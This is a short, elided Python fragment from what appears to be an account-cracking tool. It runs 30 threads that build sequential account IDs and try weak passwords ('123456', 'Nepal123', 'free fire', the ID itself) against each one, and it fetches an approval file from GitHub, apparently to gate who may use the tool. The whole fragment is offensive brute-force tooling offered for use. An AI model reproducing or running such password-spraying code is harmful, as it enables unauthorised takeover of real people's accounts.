...
def npl():
                ...
                with tred(max_workers=30) as MUGHAL:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'123456','12345678','Nepal123','nepal123','free fire']
                                MUGHAL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def main_apv():
    ...
    r1 = requests.get('https://github.com/manas-2063/approval/blob/main/approval.txt').text
